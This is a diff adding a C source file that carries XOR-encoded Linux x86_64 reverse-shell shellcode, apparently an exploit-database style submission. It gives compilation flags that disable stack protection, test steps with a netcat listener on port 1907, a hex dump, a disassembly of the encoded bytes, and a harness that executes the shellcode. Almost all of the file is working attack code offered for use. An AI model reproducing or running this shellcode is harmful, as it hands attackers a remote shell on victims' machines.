@@ -1,0 +1,94 @@
+/* 
+reverse shell tcp (1907) port shellcode C language - Linux/x86_64
+
+	Author : Kağan Çapar
+	contact: kagancapar@gmail.com
+	shellcode len : 119 bytes
+	compilation: gcc -fno-stack-protector -z execstack reverse-shell.c -o reverse-shell
+	
+	Test:
+	run your machine: nc -vlp 1907
+	and run exploit (./reverse-shell)
+	check shellcode raw and test ls, who, pwd command.
+
+
+<shellproccod>:		0x48	0x31	0xc9	0x48	0x81	0xe9	0xf6	0xff
+<shellproccod+8>:	0xff	0xff	0x48	0x8d	0x05	0xef	0xff	0xff
+<shellproccod+16>:	0xff	0x48	0xbb	0xdf	0x4b	0x06	0xb1	0x71
+<shellproccod+24>:	0x71	0x46	0x28	0x48	0x31	0x58	0x27	0x48
+<shellproccod+32>:	0x2d	0xf8	0xff	0xff	0xff	0xe2	0xf4	0xb5
+<shellproccod+40>:	0x62	0x5e	0x28	0x1b	0x73	0x19	0x42	0xde
+<shellproccod+48>:	0x15	0x09	0xb4	0x39	0xe6	0x0e	0x91	0xdd
+<shellproccod+56>:	0x4b	0x01	0xc2	0x0e	0x71	0x46	0x29	0x8e
+<shellproccod+64>:	0x03	0x8f	0x57	0x1b	0x61	0x1c	0x42	0xf5
+<shellproccod+72>:	0x13	0x09	0xb4	0x1b	0x72	0x18	0x60	0x20
+<shellproccod+80>:	0x85	0x6c	0x90	0x29	0x7e	0x43	0x5d	0x29
+<shellproccod+88>:	0x21	0x3d	0xe9	0xe8	0x39	0xfd	0x07	0xbd
+<shellproccod+96>:	0x22	0x68	0x9e	0x02	0x19	0x46	0x7b	0x97
+<shellproccod+104>:	0xc2	0xe1	0xe3	0x26	0x39	0xcf	0xce	0xd0
+<shellproccod+112>:	0x4e	0x06	0xb1	0x71	0x71	0x46	0x28
+
+	
+assembly code is below:
+
+xor    %rcx,%rcx
+sub    $0xfffffffffffffff6,%rcx
+lea    -0x11(%rip),%rax        			# 0x555555558060 <shellproccod>
+movabs $0x28467171b1064bdf,%rbx
+xor    %rbx,0x27(%rax)
+sub    $0xfffffffffffffff8,%rax
+loop   0x55555555807b <shellproccod+27>
+mov    $0x62,%ch
+pop    %rsi
+sub    %bl,(%rbx)
+jae    0x5555555580a7 <shellproccod+71>
+rex.X ficoms -0x19c64bf7(%rip) 			# 0x55553b8f349e
+xchg   %eax,%ecx
+fisttpll 0x1(%rbx)
+retq   $0x710e
+rex.RX sub %r9d,0x1b578f03(%rsi)
+(bad)  
+sbb    $0x42,%al
+cmc    
+adc    (%rcx),%ecx
+mov    $0x1b,%ah
+jb     0x5555555580c6 <shellproccod+102>  
+and    %al,0x7e29906c(%rbp)
+rex.XB pop %r13
+sub    %esp,(%rcx)
+cmp    $0xfd39e8e9,%eax  
+mov    $0x29e6822,%ebp
+sbb    %eax,0x7b(%rsi)
+xchg   %eax,%edi
+retq   $0xe3e1
+es cmp %ecx,%edi 
+rorb   0x6(%rsi)
+mov    $0x71,%cl
+jno    0x55555555811c
+sub    %al,(%rax)
+   
+
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char shellproccod[] = \
+"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff"
+"\xff\xff\x48\xbb\xdf\x4b\x06\xb1\x71\x71\x46\x28\x48\x31\x58"
+"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xb5\x62\x5e\x28\x1b\x73"
+"\x19\x42\xde\x15\x09\xb4\x39\xe6\x0e\x91\xdd\x4b\x01\xc2\x0e"
+"\x71\x46\x29\x8e\x03\x8f\x57\x1b\x61\x1c\x42\xf5\x13\x09\xb4"
+"\x1b\x72\x18\x60\x20\x85\x6c\x90\x29\x7e\x43\x5d\x29\x21\x3d"
+"\xe9\xe8\x39\xfd\x07\xbd\x22\x68\x9e\x02\x19\x46\x7b\x97\xc2"
+"\xe1\xe3\x26\x39\xcf\xce\xd0\x4e\x06\xb1\x71\x71\x46\x28";
+
+int main()
+{
+	printf("Shellcode len: %d\n", strlen(shellproccod));
+	
+	int (*ret)() = (int(*)())shellproccod;
+	
+	ret();
+	
+}
